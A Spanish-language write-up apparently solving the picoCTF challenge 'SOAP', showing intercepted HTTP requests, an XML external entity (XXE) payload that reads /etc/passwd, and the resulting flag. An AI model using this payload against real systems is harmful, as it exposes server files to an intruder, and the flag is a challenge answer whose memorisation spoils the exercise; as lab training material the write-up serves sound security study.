## Reto: SOAP
### Descripción
El proyecto web se apresuró y no se realizó ninguna evaluación de seguridad. ¿Puedes leer el archivo /etc/passwd?[Portal Web](http://saturn.picoctf.net:57433/)
### Solución

Al abrir el enlace y buscar en el codigo fuente, no nos aparece ningun tipo de informacion, por lo que procederemos a ingresar a la herramienta `Burp-suite`.

Una vez dentro del proxy de `Burp suite` encontramos lo siguiente:
```
GET /favicon.ico HTTP/1.1
Host: saturn.picoctf.net:57433
Accept-Language: es-ES,es;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://saturn.picoctf.net:57433/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
Y al dar click en el primer boton:
```
POST /data HTTP/1.1
Host: saturn.picoctf.net:57433
Content-Length: 61
Accept-Language: es-ES,es;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:57433
Referer: http://saturn.picoctf.net:57433/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```
Ahora procedemos a seguir los pasos para hacer el xxe injection

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
<ID>
&xxe;1
</ID>
</data>
```

Y esto nos regresara la bandera al momento d ela respuesta:
```
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

### Notas adicionales
### Referencias

